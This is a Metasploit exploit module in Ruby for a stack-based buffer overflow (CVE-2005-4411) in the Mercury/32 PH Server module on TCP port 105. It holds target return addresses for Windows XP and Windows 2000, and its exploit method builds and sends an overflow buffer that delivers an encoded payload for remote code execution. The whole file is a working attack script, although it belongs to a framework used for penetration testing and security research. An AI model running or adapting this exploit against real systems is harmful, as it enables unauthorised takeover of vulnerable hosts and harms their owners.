##
# $Id: mercury_phonebook.rb 9525 2010-06-15 07:18:08Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Mercury/32 <= v4.01b PH Server Module Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack-based buffer overflow in
				Mercury/32 <= v4.01b PH Server Module. This issue is
				due to a failure of the application to properly bounds check
				user-supplied data prior to copying it to a fixed size memory buffer.
			},
			'Author'         => 'MC',
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9525 $',
			'References'     =>
				[
					[ 'CVE', '2005-4411' ],
					[ 'OSVDB', '22103'],
					[ 'BID', '16396' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'Space'    => 500,
					'BadChars' => "\x00\x20\x0a\x0d",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP Pro SP0/SP1 English', { 'Ret' => 0x71aa32ad } ],
					[ 'Windows 2000 Pro English ALL',   { 'Ret' => 0x75022ac4 } ],
				],
			'Privileged'     => true,
			'DisclosureDate' => 'Dec 19 2005',
			'DefaultTarget' => 0))

		register_options([ Opt::RPORT(105)], self)
	end

	def exploit
		connect

		print_status("Trying target #{target.name}...")

		sploit =  rand_text_alphanumeric(224, payload_badchars)
		sploit << payload.encoded + "\xeb\x06" + make_nops(2)
		sploit << [target.ret].pack('V') + [0xe8, -450].pack('CV') + "\r\n"

		sock.put(sploit)

		handler
		disconnect
	end

end
